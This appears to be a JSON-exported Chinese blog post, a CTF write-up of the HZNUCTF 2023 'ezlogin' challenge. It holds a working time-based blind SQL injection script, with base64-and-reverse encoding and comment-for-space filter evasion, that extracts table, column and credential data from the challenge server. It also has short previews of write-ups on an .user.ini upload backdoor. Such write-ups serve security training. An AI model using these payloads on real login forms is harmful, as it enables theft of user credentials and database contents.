{"title":"HZNUCTF 2023 preliminary-ezlogin","uid":"f91bc0d4882aff535a39c946a3135f15","slug":"HZNUCTF-2023-preliminary-ezlogin","date":"2023-04-11T11:59:45.000Z","updated":"2023-04-11T12:50:06.880Z","comments":true,"path":"api/articles/HZNUCTF-2023-preliminary-ezlogin.json","keywords":null,"cover":null,"content":"<p>1.png</p>\n<p>查看网页源码，发现提示</p>\n<p>2.png</p>\n<p>对输入的username做判断，过滤掉select，union，and，database</p>\n<p>并且对输入内容进行base64解码和字符串反转</p>\n<p>页面根据输入内容没有明显回显和页面跳转，尝试盲注，延时注入</p>\n<p>首先构造payload判断闭合符</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\n\n$a &#x3D; &quot;1&#39;||if(1,sleep(5),1)#&quot;;\n$b &#x3D; base64_encode(strrev($a));\n$c &#x3D; strrev(base64_decode($b));\n\necho $b;\n?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>闭合符为’且过滤了空格</p>\n<p>通过延时注入脚本查看库名</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">import requests\nimport base64\nimport datetime\n\nurl&#x3D;&#39;http:&#x2F;&#x2F;node3.anna.nssctf.cn:28992&#x2F;&#39;\nflag &#x3D; &#39;&#39;\n\nfor i in range(1,100):\n    low &#x3D; 32\n    high &#x3D; 130\n    mid &#x3D; (high + low) &#x2F;&#x2F; 2\n    while (low &lt; high):\n        #payload &#x3D; &quot;1&#39;||if((ascii(substr((DATABASE()),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;\n        #payload &#x3D; &quot;1&#39;||if((ascii(substr((SELECT&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#x2F;**&#x2F;DATABASE()),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;\n        #payload &#x3D; &quot;1&#39;||if((ascii(substr((SELECT&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;like&#x2F;**&#x2F;DATABASE()&#x2F;**&#x2F;AND&#x2F;**&#x2F;table_name&#x2F;**&#x2F;like&#x2F;**&#x2F;&#39;user&#39;),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;\n        #payload &#x3D; &quot;1&#39;||if((ascii(substr((SELECT&#x2F;**&#x2F;group_concat(&#39;username&#39;,&#39;^&#39;&#39;password&#39;)&#x2F;**&#x2F;from&#x2F;**&#x2F;users.user),&#123;&#125;,1)))&gt;&#123;&#125;,sleep(1),1)#&quot;\n\n        payload &#x3D; payload.format(i, mid)\n        print(payload)\n        payload &#x3D; base64.b64encode(payload[::-1].encode(&quot;utf-8&quot;))\n        data &#x3D; &#123;\n            &#39;username&#39;:payload,\n            &#39;passwd&#39;:&#39;1&#39;\n        &#125;\n        time1 &#x3D; datetime.datetime.now()\n        r &#x3D; requests.post(url, data)\n        time2 &#x3D; datetime.datetime.now()\n        time &#x3D; (time2 - time1).seconds\n        if time &gt; 1:\n            low &#x3D; mid + 1\n        else:\n            high &#x3D; mid\n        mid &#x3D; (low + high) &#x2F;&#x2F; 2\n    if (mid &#x3D;&#x3D; 32 or mid &#x3D;&#x3D; 130):\n        break\n    flag +&#x3D; chr(mid)\n\nprint(flag)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>库名:users</p>\n<p>暴表：user</p>\n<p>暴字段：id,username,password</p>\n<p>暴数据：</p>\n","text":"1.png 查看网页源码，发现提示 2.png 对输入的username做判断，过滤掉select，union，and，database 并且对输入内容进行base64解码和字符串反转 页面根据输入内容没有明显回显和页面跳转，尝试盲注，延时注入 首先构造payload判断闭合符 ...","link":"","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[],"tags":[{"name":"SQL注入 盲注","slug":"SQL注入-盲注","count":1,"path":"api/tags/SQL注入-盲注.json"}],"toc":"","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"SUCTF 2019-CheckIn","uid":"7028e45966f0fd8a9175e6d471456f27","slug":"SUCTF-2019-CheckIn","date":"2023-04-12T12:42:18.000Z","updated":"2023-04-12T12:51:19.358Z","comments":true,"path":"api/articles/SUCTF-2019-CheckIn.json","keywords":null,"cover":[],"text":" 文件上传，对文件类型，后缀名，文件内容都进行了过滤 用.uer.ini绕过 利用.user.ini指定文件，在当前目录下的文件执行时会将指定文件中的代码执行出来，以此实现带入后门 准备一个.user.ini文件，内容如下 GIF89a? auto_prepend_file &#...","link":"","photos":[],"count_time":{"symbolsCount":315,"symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"后缀名绕过","slug":"后缀名绕过","count":1,"path":"api/tags/后缀名绕过.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"MRCTF2020-Ez_bypass","uid":"15f43a16d1c74aa2d0aa05ce47e43933","slug":"MRCTF2020-Ez-bypass","date":"2023-04-08T11:33:05.000Z","updated":"2023-04-08T11:38:10.214Z","comments":true,"path":"api/articles/MRCTF2020-Ez-bypass.json","keywords":null,"cover":[],"text":" md5强碰撞 ?gg[]&#x3D;1&amp;id[]&#x3D;2 is_numeric弱比较 1234567a数字后加字母会被整体转成数字 等到flag ","link":"","photos":[],"count_time":{"symbolsCount":82,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}